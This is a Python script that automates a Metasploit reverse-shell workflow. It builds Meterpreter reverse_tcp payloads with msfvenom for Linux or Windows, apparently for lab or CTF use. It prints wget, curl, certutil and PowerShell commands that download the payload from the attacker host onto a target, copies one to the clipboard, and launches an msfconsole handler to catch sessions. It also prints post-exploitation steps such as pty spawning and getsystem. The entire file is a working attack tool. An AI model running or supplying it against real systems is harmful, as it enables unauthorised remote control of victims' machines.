import subprocess
import re
import socket
import sys
import os
import tempfile
import time

# ---------- Helpers ----------
def is_valid_port(p):
    try:
        n = int(p)
        return 1 <= n <= 65535
    except (ValueError, TypeError):
        return False

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except OSError:
        return False

def port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("0.0.0.0", port))
            return False
        except OSError:
            return True

def find_free_port(start):
    p = start
    while p <= 65535:
        if not port_in_use(p):
            return p
        p += 1
    return None

def wait_for_port_free(port, timeout=10.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not port_in_use(port):
            return True
        time.sleep(0.25)
    return False

# ---------- LHOST ----------
lhost = input("lhost: ").strip()
if lhost == "":
    try:
        result = subprocess.run(
            ["ip", "a", "show", "tun0"],
            capture_output=True, text=True, timeout=5
        )
        match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", result.stdout or "")
        if match:
            lhost = match.group(1)
        else:
            print("[!] Could not find inet address on tun0")
            sys.exit(1)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print(f"[!] Error getting tun0 IP: {e}")
        sys.exit(1)

if not is_valid_ip(lhost):
    print(f"[!] Invalid LHOST: {lhost}")
    sys.exit(1)
print(f"[*] Using LHOST: {lhost}")

# ---------- LPORT ----------
lport = input("lport: ").strip()
if lport == "":
    lport = "9443"
if not is_valid_port(lport):
    print(f"[!] Invalid port: {lport}. Falling back to 9443.")
    lport = "9443"
lport = int(lport)

if port_in_use(lport):
    new_port = find_free_port(lport + 1)
    if new_port is None:
        print(f"[!] Port {lport} in use and no free port found.")
        sys.exit(1)
    print(f"[!] Port {lport} already in use. Switching to {new_port}.")
    lport = new_port

print(f"[*] Using LPORT: {lport}")

# ---------- OS env ----------
osenv = input("os_env [def lin] [1 win]: ").strip()
if osenv == "":
    os_env = 0
else:
    try:
        os_env = int(osenv)
        if os_env not in (0, 1):
            raise ValueError
    except ValueError:
        print("[!] Invalid os_env, defaulting to Linux (0).")
        os_env = 0

# ---------- Outfile ----------
outfile = input("outfile: ").strip()
if outfile == "":
    outfile = "meter.elf" if os_env == 0 else "meter.exe"
outfile = os.path.basename(outfile)
if not outfile:
    print("[!] Invalid outfile name.")
    sys.exit(1)
print(f"[*] Using outfile: {outfile}")

# ---------- Payload ----------
PAYLOAD = None
if os_env == 0:
    PAYLOAD = "linux/x64/meterpreter_reverse_tcp"
    fmt = "elf"
else:
    PAYLOAD = "windows/x64/meterpreter/reverse_tcp"
    fmt = "exe"

cmd = [
    "msfvenom",
    "-p", PAYLOAD,
    f"LHOST={lhost}",
    f"LPORT={lport}",
    "-f", fmt,
    "-o", outfile,
]
print(f"[*] Running: {' '.join(cmd)}")
try:
    ret = subprocess.run(cmd, check=False)
    if ret.returncode != 0:
        print(f"[!] msfvenom exited with code {ret.returncode}")
        sys.exit(1)
except FileNotFoundError:
    print("[!] msfvenom not found in PATH.")
    sys.exit(1)

if not os.path.isfile(outfile):
    print(f"[!] Payload file '{outfile}' was not created. Aborting.")
    sys.exit(1)

# ---------- Server type ----------
server_type = input("server_type [def python] [1 php]: ").strip()
if server_type != "":
    print("the method is not LOL(living off land). please wait for script update")
    sys.exit(0)

# ---------- Download commands ----------
print("on target try:")
if os_env == 0:
    download_cmd = f"wget http://{lhost}:{lport}/{outfile}"
    curl_cmd     = f"curl http://{lhost}:{lport}/{outfile} -o {outfile}"
    py_cmd       = f"python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{lhost}:{lport}/{outfile}','{outfile}')\""
else:
    download_cmd = f"certutil -urlcache -split -f http://{lhost}:{lport}/{outfile} {outfile}"
    curl_cmd     = f"curl.exe -o {outfile} http://{lhost}:{lport}/{outfile}"
    py_cmd       = f"powershell -c \"iwr http://{lhost}:{lport}/{outfile} -OutFile {outfile}\""

print(f"1. {download_cmd}")
print(f"2. {curl_cmd}")
print(f"3. {py_cmd}")

# ---------- Clipboard ----------
def copy_to_clipboard(text):
    for cmd in (["xclip", "-selection", "clipboard"],
                ["xsel", "--clipboard", "--input"]):
        try:
            subprocess.run(cmd, input=text, text=True, check=True)
            print(f"[*] Copied to clipboard: {text}")
            return
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue
    print(f"[!] Could not copy to clipboard. Command: {text}")

# ---------- Choice loop ----------
chosen_cmd = None
while chosen_cmd is None:
    try:
        copy_choice = input("choice: ").strip()
    except EOFError:
        sys.exit(0)

    if copy_choice == "":
        chosen_cmd = download_cmd
    elif copy_choice == "2":
        chosen_cmd = curl_cmd
    elif copy_choice == "3":
        chosen_cmd = py_cmd
    else:
        print("[!] Invalid choice. Press enter for default.")

copy_to_clipboard(chosen_cmd)

# ---------- User-hosted server instructions ----------
print()
print("=" * 60)
print("[*] Start your own HTTP server in another terminal to host the payload.")
print(f"[*] Example (run from the directory containing '{outfile}'):")
print(f"      python3 -m http.server {lport} --bind 0.0.0.0")
print()
print("[*] Then run the copied download command on the target.")
print("[*] When the target has downloaded the payload, stop your HTTP server")
print(f"    (Ctrl+C in that terminal) so port {lport} is free for msfconsole.")
print("=" * 60)

input("[*] Press Enter when you have stopped your HTTP server and are ready for msfconsole... ")

# ---------- Wait for port to actually be free ----------
print(f"[*] Waiting for port {lport} to be free...")
if not wait_for_port_free(lport, timeout=15):
    print(f"[!] Port {lport} still appears in use. msfconsole may fail to bind.")
    input("[*] Press Enter to continue anyway, or Ctrl+C to abort... ")
else:
    print(f"[*] Port {lport} is free.")

# ---------- msfconsole handler ----------
def launch_msfconsole():
    rc_lines = [
        "use exploit/multi/handler",
        f"set payload {PAYLOAD}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",
        "run -j",
        "",
    ]
    fd, rc_path = tempfile.mkstemp(prefix="msf_rc_", suffix=".rc")
    try:
        with os.fdopen(fd, "w") as f:
            f.write("\n".join(rc_lines))
        print(f"[*] Launching msfconsole with handler on port {lport} (rc: {rc_path})")
        print("[*] Once a session is caught: sessions -> sessions -i <id> -> shell")
        subprocess.run(["msfconsole", "-q", "-r", rc_path], check=False)
    except FileNotFoundError:
        print("[!] msfconsole not found in PATH.")
    finally:
        try:
            os.unlink(rc_path)
        except OSError:
            pass

print()
print("=" * 60)
print("[*] Starting msfconsole handler in this shell.")
print("[*] After a session is caught inside msfconsole, run:")
print("      sessions")
print("      sessions -i <id>")
if os_env == 0:
    print("      shell")
    print("      python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
else:
    print("      shell")
    print("      (Windows: use `upload` / `download` / `getsystem` from meterpreter prompt)")
print("=" * 60)

try:
    launch_msfconsole()
except KeyboardInterrupt:
    print("\n[*] Interrupted.")
finally:
    print("[*] Exiting.")
    sys.exit(0)
